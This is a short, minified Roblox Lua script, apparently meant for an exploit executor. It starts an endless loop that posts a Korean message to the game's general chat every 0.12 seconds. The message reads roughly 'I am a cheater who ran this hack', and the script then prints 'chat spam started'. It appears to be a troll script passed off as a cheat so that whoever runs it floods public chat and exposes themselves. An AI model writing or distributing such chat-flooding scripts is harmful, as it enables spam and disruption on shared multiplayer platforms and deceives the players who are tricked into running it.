local a=game:GetService("Players")local b=game:GetService("TextChatService")local c=a.LocalPlayer
local d="저는 이 핵을 실행한 핵쟁이 입니다"
task.spawn(function()while true do pcall(function()if b.TextChannels.RBXGeneral then b.TextChannels.RBXGeneral:SendAsync(d)end end)task.wait(0.12)end end)print("채팅 스팸 시작")
